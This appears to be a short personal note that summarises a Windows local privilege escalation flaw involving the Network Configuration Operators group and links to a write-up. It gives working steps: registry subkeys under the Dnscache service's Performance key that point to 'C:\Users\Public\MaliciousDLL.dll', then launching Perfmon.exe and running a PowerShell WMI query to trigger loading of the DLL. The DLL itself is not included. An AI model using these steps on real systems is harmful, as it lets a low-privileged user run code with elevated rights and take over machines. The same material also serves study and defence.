---
title: Flaw in The “Network Configuration Operators” group
updated: 2025-05-08 07:27:20Z
created: 2025-05-08 07:08:32Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---

https://birkep.github.io/posts/Windows-LPE/
* * *
1. Register the performance monitoring routine by creting following 4 registry subkeys under: **HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Performance**

**Library** (Name of your performance DLL)
**Open** (Name of your Open function in your DLL)
**Collect** (Name of your Collect function in your DLL)
**Close** (Name of your Close function in your DLL)

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dnscache\Performance\
Name: Library
Type: REG_SZ
Data: "C:\Users\Public\MaliciousDLL.dll"

Name: Open
Type: REG_SZ
Data: OpenPerfData

Name: Collect
Type: REG_SZ
Data: CollectPerfData

Name: Close
Type: REG_SZ
Data: ClosePerfData
```


2. Launch **Perfmon.exe**
3.  Query the Performance Counters with WMI as a the Consumer:
`Get-WmiObject -List | Where-Object { $_.Name -Like "Win32_Perf*" }`